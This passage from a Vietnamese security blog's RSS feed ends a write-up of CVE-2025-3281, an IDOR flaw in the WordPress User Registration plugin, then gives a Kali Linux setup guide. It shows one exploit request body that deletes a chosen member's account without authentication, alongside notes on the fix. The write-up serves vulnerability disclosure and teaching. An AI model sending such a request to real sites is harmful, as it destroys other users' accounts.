wp_lang=en_US&#xA;&#xA;action=user_registration_membership_create_stripe_subscription&amp;amp;_ajax_nonce=472f729de7&amp;amp;member_id=member_id_to_delete&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-3281&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác h√†m &lt;code&gt;create_stripe_subscription()&lt;/code&gt; cho ph√©p truy c·∫≠p kh√¥ng x√°c th·ª±c trong khi l·∫°i x·ª≠ l√Ω tr·ª±c ti·∫øp d·ªØ li·ªáu nh·∫°y c·∫£m do ng∆∞·ªùi d√πng ki·ªÉm so√°t. Vi·ªác thi·∫øu ki·ªÉm tra quy·ªÅn ƒë·ªëi v·ªõi &lt;code&gt;member_id&lt;/code&gt;, k·∫øt h·ª£p v·ªõi vi·ªác endpoint ƒë∆∞·ª£c expose qua &lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt;, ƒë√£ t·∫°o ƒëi·ªÅu ki·ªán ƒë·ªÉ attacker x√≥a t√†i kho·∫£n ng∆∞·ªùi d√πng m·ªôt c√°ch tr√°i ph√©p.&#xA;B·∫£n v√° ·ªü phi√™n b·∫£n 4.2.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch b·ªï sung ki·ªÉm tra quy·ªÅn (&lt;code&gt;current_user_can&lt;/code&gt;), ngƒÉn ch·∫∑n ho√†n to√†n h√†nh vi IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonce kh√¥ng thay th·∫ø cho ki·ªÉm tra quy·ªÅn truy c·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;C√°c endpoint &lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; c·∫ßn ƒë∆∞·ª£c ki·ªÉm so√°t ch·∫∑t ch·∫Ω.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng n√™n th·ª±c hi·ªán h√†nh ƒë·ªông nh·∫°y c·∫£m (x√≥a user, thay ƒë·ªïi tr·∫°ng th√°i) ch·ªâ d·ª±a tr√™n d·ªØ li·ªáu t·ª´ client.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra quy·ªÅn (&lt;code&gt;current_user_can&lt;/code&gt;) l√† b·∫Øt bu·ªôc khi thao t√°c v·ªõi t√†i nguy√™n ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;li&gt;IDOR th∆∞·ªùng xu·∫•t hi·ªán khi business logic thi·∫øu r√†ng bu·ªôc v·ªÅ quy·ªÅn, kh√¥ng ch·ªâ do l·ªói k·ªπ thu·∫≠t ƒë∆°n thu·∫ßn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/user-registration/vulnerability/wordpress-user-registration-membership-plugin-4-2-1-insecure-direct-object-reference-to-unauthenticated-limited-user-deletion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin &amp;lt;= 4.2.1 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Setup Kali Linux For Pentest</title>
      <link>http://localhost:1313/vi/posts/2025-12-25-setup-kali-for-pentest/</link>
      <pubDate>Thu, 25 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-25-setup-kali-for-pentest/</guid>
      <category domain="http://localhost:1313/vi/categories/pentest/">Pentest</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-25-setup-kali-for-pentest/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;update--upgrade&#34;&gt;&lt;span&gt;Update &amp;amp; Upgrade&lt;/span&gt;&#xA;  &lt;a href=&#34;#update--upgrade&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt update -y &amp;amp;&amp;amp; sudo apt update -y &amp;amp;&amp;amp; sudo apt full-upgrade -y&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;download-fcitx5-unikey&#34;&gt;&lt;span&gt;Download Fcitx5 Unikey&lt;/span&gt;&#xA;  &lt;a href=&#34;#download-fcitx5-unikey&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fcitx5 fcitx5-unikey fcitx5-config-qt fcitx5-frontend-gtk3 fcitx5-frontend-gtk2 -y&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Config&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;fcitx5-configtool&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;download-vscode&#34;&gt;&lt;span&gt;Download VSCode&lt;/span&gt;&#xA;  &lt;a href=&#34;#download-vscode&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Download t·ª´ &lt;a href=&#34;https://code.visualstudio.com/download&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://code.visualstudio.com/download&lt;/a&gt; ho·∫∑c s·ª≠ d·ª•ng terminal:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wget -O vscode.deb &amp;#34;https://code.visualstudio.com/sha/download?build=stable&amp;amp;os=linux-deb-x64&#xA;sudo apt install ./vscode.deb&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;download-hugo-for-blog&#34;&gt;&lt;span&gt;Download Hugo for Blog&lt;/span&gt;&#xA;  &lt;a href=&#34;#download-hugo-for-blog&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;T·∫£i v·ªÅ&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;wget https://github.com/gohugoio/hugo/releases/download/v0.153.0/hugo_extended_0.153.0_linux-amd64.tar.gz&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Gi·∫£i n√©n v√† c√†i&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;tar -xvzf hugo_extended_*_linux-amd64.tar.gz&#xA;sudo mv hugo /usr/local/bin/&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;remove-underline-in-zsh&#34;&gt;&lt;span&gt;Remove Underline in Zsh&lt;/span&gt;&#xA;  &lt;a href=&#34;#remove-underline-in-zsh&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;(( ${&amp;#43;ZSH_HIGHLIGHT_STYLES} )) || typeset -A ZSH_HIGHLIGHT_STYLES&#xA;ZSH_HIGHLIGHT_STYLES[path]=none&#xA;ZSH_HIGHLIGHT_STYLES[path_prefix]=none&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Thay ƒë·ªïi t·∫•t c·∫£ t·ª´ &lt;code&gt;underline&lt;/code&gt; th√†nh &lt;code&gt;none&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;-ZSH_HIGHLIGHT_STYLES[unknown-token]=underline&#xA;&amp;#43;ZSH_HIGHLIGHT_STYLES[unknown-token]=none&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;eza-for-ls-ouput&#34;&gt;&lt;span&gt;&lt;code&gt;eza&lt;/code&gt; for &lt;code&gt;ls&lt;/code&gt; ouput&lt;/span&gt;&#xA;  &lt;a href=&#34;#eza-for-ls-ouput&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;T·∫£i&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install eza&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;C·∫•u h√¨nh&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias ls=&amp;#39;eza --group-directories-first&amp;#39;&#xA;alias ll=&amp;#39;eza -lah --group-directories-first&amp;#39;&#xA;alias la=&amp;#39;eza -a --group-directories-first&amp;#39;&#xA;alias lt=&amp;#39;eza --tree --group-directories-first&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;grc-for-color-output&#34;&gt;&lt;span&gt;&lt;code&gt;grc&lt;/code&gt; for Color Output&lt;/span&gt;&#xA;  &lt;a href=&#34;#grc-for-color-output&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;T·∫£i&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install grc -y&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;C·∫•u h√¨nh&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;# Auto alias commands supported by grc (except ls)&#xA;if command -v grc &amp;gt;/dev/null; then&#xA;  for f in /usr/share/grc/conf.*; do&#xA;    cmd=&amp;#34;${f##*/conf.}&amp;#34;  &#xA;    [ &amp;#34;$cmd&amp;#34; = &amp;#34;ls&amp;#34; ] &amp;amp;&amp;amp; continue&#xA;    alias &amp;#34;$cmd=grc $cmd&amp;#34;&#xA;  done&#xA;fi&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;fzf--fuzzy-finder&#34;&gt;&lt;span&gt;&lt;code&gt;fzf&lt;/code&gt; ‚Äì fuzzy finder&lt;/span&gt;&#xA;  &lt;a href=&#34;#fzf--fuzzy-finder&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fzf&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;bat-for-read-file&#34;&gt;&lt;span&gt;&lt;code&gt;bat&lt;/code&gt; for Read File&lt;/span&gt;&#xA;  &lt;a href=&#34;#bat-for-read-file&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;T·∫£i&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install bat&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;C·∫•u h√¨nh&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias bat=&amp;#34;batcat&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;font&#34;&gt;&lt;span&gt;Font&lt;/span&gt;&#xA;  &lt;a href=&#34;#font&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fonts-firacode fonts-jetbrains-mono&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;some-alias&#34;&gt;&lt;span&gt;Some alias&lt;/span&gt;&#xA;  &lt;a href=&#34;#some-alias&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 